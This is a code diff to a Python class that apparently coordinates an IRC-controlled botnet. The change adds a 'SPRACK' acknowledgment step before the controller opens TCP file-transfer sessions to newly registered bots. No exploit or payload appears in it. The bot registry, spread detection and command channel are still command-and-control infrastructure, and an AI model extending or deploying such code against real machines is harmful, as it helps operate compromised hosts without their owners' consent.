@@ -10,6 +10,7 @@ class DisplacementHandler:
 
         self.irc_connection.onBroadcastRequested.subscribe(self.irc_onBroadcastRequested)
         self.irc_connection.onSpreadDetected.subscribe(self.irc_onSpreadDetected)
+        self.irc_connection.onSpreadAcknowledged.subscribe(self.irc_onSpreadAcknowledged)
         self.irc_connection.onSomeoneLeftChannel.subscribe(self.irc_onSomeoneLeftChannel)
 
 
@@ -33,21 +34,34 @@ class DisplacementHandler:
             logging.info(f"Bot added to DB: nick: {nick}, ip: {ip} port: {port}")
             logging.info(f"Number of bots: {len(self.botnetDB.get_bots())}")
 
-            tcpClient = tcp_services.TCPClient(ip, port)
-            tcpSession = tcpClient.connect()
-            if tcpSession is not None:
-                bot.set_tcp_session(tcpSession)
-                bot.get_tcp_session().get_data_link().set_download_path(self.myContext.pathToFiles)
-                bot.get_tcp_session().identify(self.myContext.ircNick)
-                bot.get_tcp_session().onSendingFinished.subscribe(self.tcpSession_onSendingFinished)
-                bot.get_tcp_session().onSendingProgress.subscribe(self.tcpSession_onSendingProgress)
-                bot.get_tcp_session().onFileReceived.subscribe(self.tcpSession_onFileReceived)
-            else:
-                logging.error(f"Failed to TCP connect to bot: nick: {nick}, ip: {ip} port: {port}")
+            self.irc_connection.send_query(nick, f"SPRACK ip:{ip} port:{port}")
 
-            bot.get_reversed_tcp_session().onSendingFinished.subscribe(self.tcpSession_onSendingFinished)
-            bot.get_reversed_tcp_session().onSendingProgress.subscribe(self.tcpSession_onSendingProgress)
-            bot.get_reversed_tcp_session().onFileReceived.subscribe(self.tcpSession_onFileReceived)
+    def irc_onSpreadAcknowledged(self, *args, **kwargs):
+        nick = kwargs.get('ircNick')
+        logging.debug(f"SPRACK received: nick:{nick}")
+
+        bot = self.botnetDB.get_bot(nick)
+        if bot is None:
+            logging.error(f"Bot not found in DB: nick: {nick}")
+            return
+        
+        ip = bot.get_ip()
+        port = bot.get_port()
+        tcpClient = tcp_services.TCPClient(ip, port)
+        tcpSession = tcpClient.connect()
+        if tcpSession is not None:
+            bot.set_tcp_session(tcpSession)
+            bot.get_tcp_session().get_data_link().set_download_path(self.myContext.pathToFiles)
+            bot.get_tcp_session().identify(self.myContext.ircNick)
+            bot.get_tcp_session().onSendingFinished.subscribe(self.tcpSession_onSendingFinished)
+            bot.get_tcp_session().onSendingProgress.subscribe(self.tcpSession_onSendingProgress)
+            bot.get_tcp_session().onFileReceived.subscribe(self.tcpSession_onFileReceived)
+        else:
+            logging.error(f"Failed to TCP connect to bot: nick: {nick}, ip: {ip} port: {port}")
+
+        bot.get_reversed_tcp_session().onSendingFinished.subscribe(self.tcpSession_onSendingFinished)
+        bot.get_reversed_tcp_session().onSendingProgress.subscribe(self.tcpSession_onSendingProgress)
+        bot.get_reversed_tcp_session().onFileReceived.subscribe(self.tcpSession_onFileReceived)
             
 
     def irc_onSomeoneLeftChannel(self, *args, **kwargs):
